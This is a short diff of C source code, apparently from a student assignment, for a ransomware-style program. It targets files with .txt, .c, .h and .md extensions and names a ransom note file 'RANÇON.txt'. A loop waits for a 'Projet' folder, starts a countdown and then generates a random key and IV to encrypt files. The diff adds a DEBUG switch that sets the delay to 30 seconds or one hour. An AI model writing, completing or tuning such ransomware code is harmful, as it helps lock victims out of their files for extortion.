@@ -15,6 +15,8 @@
 #define EXTENSIONS ".txt|.c|.h|.md"
 #define RANSOM_FILE "TP/Projet/RANÇON.txt"
 
+#define DEBUG 1
+
 int should_encrypt(const char *filename) {
     const char *ext = strrchr(filename, '.');
     return ext && (strstr(EXTENSIONS, ext) != NULL);
@@ -90,8 +92,15 @@ int main() {
             countdown_started = 1;
             printf("Dossier Projet détecté. Décompte lancé.\n");
         }
+        int compteur ;
+        if(DEBUG == 1){
+            compteur = 30;
+        }
+        else {
+            compteur = 60*60;
+        }
 
-        if (countdown_started && difftime(time(NULL), start) >= 30) { // 30s pour test
+        if (countdown_started && difftime(time(NULL), start) >= compteur) { // 30s pour test
             printf("Temps écoulé. Chiffrement en cours...\n");
             unsigned char key[32], iv[16];
             RAND_bytes(key, 32);
